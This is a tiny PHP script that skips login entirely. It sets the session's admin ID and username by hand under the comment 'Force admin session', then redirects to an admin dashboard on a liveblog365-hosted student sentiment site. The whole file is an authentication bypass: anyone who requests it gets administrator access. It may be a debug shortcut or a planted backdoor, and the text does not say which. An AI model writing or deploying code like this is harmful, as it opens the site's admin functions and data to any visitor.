<?php
session_start();

// Force admin session
$_SESSION['admin_id'] = 1;
$_SESSION['admin_username'] = 'admin';

// Absolute redirect
header("Location: https://student-sentiment.liveblog365.com/admin/dashboard.php");
exit;
